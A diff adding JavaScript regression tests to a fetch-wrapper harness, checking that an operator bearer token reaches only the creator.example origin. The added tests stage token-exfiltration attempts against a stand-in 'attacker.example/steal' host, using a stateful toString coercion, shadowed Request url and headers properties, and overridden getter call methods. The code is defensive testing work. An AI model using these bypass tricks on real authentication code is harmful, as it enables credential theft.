@@ -28,7 +28,7 @@ function loadHarness(key = 'op-secret') {
     return {status: 200, ok: true, json: async () => ({operator: true})};
   }
 
-  const window = {fetch: originalFetch, Request: NativeRequest};
+  const window = {fetch: originalFetch, Request: NativeRequest, Headers: NativeHeaders, URL};
   const context = {
     window,
     location: {origin: 'https://creator.example', href: baseUrl},
@@ -119,6 +119,24 @@ test('forged Request-like url cannot smuggle bearer to string-coerced hostile ta
   assert.equal(h.calls[0].outbound.headers.get('authorization'), null);
 });
 
+test('stateful non-Request coercion is consumed once and bound to dispatched target', async () => {
+  const h = loadHarness();
+  let coercions = 0;
+  const forged = {
+    toString() {
+      coercions += 1;
+      return coercions === 1
+        ? 'https://creator.example/api/dashboard'
+        : 'https://attacker.example/steal';
+    },
+  };
+  await h.fetch(forged);
+  assert.equal(coercions, 1);
+  assert.equal(h.calls[0].outbound.url, 'https://creator.example/api/dashboard');
+  assert.equal(authHeader(h.calls[0]), 'Bearer op-secret');
+  assert.equal(h.calls[0].outbound.headers.get('authorization'), 'Bearer op-secret');
+});
+
 test('native Request own url shadow cannot smuggle bearer across its internal target', async () => {
   const h = loadHarness();
   const request = new h.Request('https://attacker.example/steal', {
@@ -149,6 +167,58 @@ test('native Request own headers shadow cannot replace inherited internal header
   });
 
   await h.fetch(request);
+
+  assert.equal(authHeader(h.calls[0]), 'Bearer op-secret');
+  assert.equal(h.calls[0].outbound.headers.get('x-internal'), 'kept');
+  assert.equal(h.calls[0].outbound.headers.get('x-shadow'), null);
+});
+
+test('native Request url getter call shadow cannot redirect classification', async () => {
+  const h = loadHarness();
+  const request = new h.Request('https://attacker.example/steal');
+  Object.defineProperty(request, 'url', {
+    value: 'https://creator.example/api/dashboard',
+    configurable: true,
+  });
+  const urlGetter = Object.getOwnPropertyDescriptor(h.Request.prototype, 'url').get;
+  const priorCall = Object.getOwnPropertyDescriptor(urlGetter, 'call');
+  try {
+    Object.defineProperty(urlGetter, 'call', {
+      value(input) { return input.url; },
+      configurable: true,
+    });
+    await h.fetch(request);
+  } finally {
+    if (priorCall) Object.defineProperty(urlGetter, 'call', priorCall);
+    else delete urlGetter.call;
+  }
+
+  assert.equal(h.calls[0].outbound.url, 'https://attacker.example/steal');
+  assert.equal(authHeader(h.calls[0]), null);
+  assert.equal(h.calls[0].outbound.headers.get('authorization'), null);
+});
+
+test('native Request headers getter call shadow cannot forge inherited headers', async () => {
+  const h = loadHarness();
+  const request = new h.Request('https://creator.example/api/dashboard', {
+    headers: {'X-Internal': 'kept'},
+  });
+  Object.defineProperty(request, 'headers', {
+    value: new h.Headers({'X-Shadow': 'forged'}),
+    configurable: true,
+  });
+  const headersGetter = Object.getOwnPropertyDescriptor(h.Request.prototype, 'headers').get;
+  const priorCall = Object.getOwnPropertyDescriptor(headersGetter, 'call');
+  try {
+    Object.defineProperty(headersGetter, 'call', {
+      value(input) { return input.headers; },
+      configurable: true,
+    });
+    await h.fetch(request);
+  } finally {
+    if (priorCall) Object.defineProperty(headersGetter, 'call', priorCall);
+    else delete headersGetter.call;
+  }
 
   assert.equal(authHeader(h.calls[0]), 'Bearer op-secret');
   assert.equal(h.calls[0].outbound.headers.get('x-internal'), 'kept');
